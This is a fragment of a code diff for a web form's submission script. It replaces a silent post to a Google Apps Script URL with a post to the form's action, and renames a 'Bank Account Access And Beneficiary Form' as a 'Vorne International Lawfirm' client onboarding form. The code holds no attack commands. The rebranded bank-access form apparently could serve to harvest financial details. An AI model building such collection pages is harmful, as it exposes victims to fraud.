-        payload.fileName = file.name;
-        payload.fileMime = file.type;
-    }
 
     try {
-        await fetch(GOOGLE_SCRIPT_URL, {
+        const response = await fetch(form.action, {
             method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
         });
 
-        alert("Your submission and uploaded file have been successfully sent!");
-        form.reset();
-        window.location.reload();
-
+        if (response.ok) {
+            alert("Your onboarding information has been successfully submitted to Vorne International Lawfirm!");
+            form.reset();
+            window.location.reload();
+        } else {
+            const data = await response.json();
+            if (Object.hasOwn(data, 'errors')) {
+                alert(data["errors"].map(error => error["message"]).join(", "));
+            } else {
+                alert("An error occurred while submitting. Please try again.");
+            }
+        }
     } catch (error) {
         console.error("Error submitting form:", error);
-        alert("An error occurred while submitting. Please try again.");
+        alert("An error occurred while submitting. Please check your connection and try again.");
     } finally {
         sendBtn.disabled = false;
-        sendBtn.innerText = "Submit Form";
+        sendBtn.innerText = "SUBMIT FORM";
     }
-}
-
-function convertFileToBase64(file) {
-    return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = (error) => reject(error);
-        reader.readAsDataURL(file);
-    });
 }
 
 async function downloadPDF() {
@@ -1026,7 +1227,7 @@ async function downloadPDF() {
         heightLeft -= pageHeight;
     }
 
-    pdf.save("Bank_Account_Access_And_Beneficiary_Form.pdf");
+    pdf.save("Vorne_Lawfirm_Client_Onboarding_Form.pdf");
 }
 </script>
 
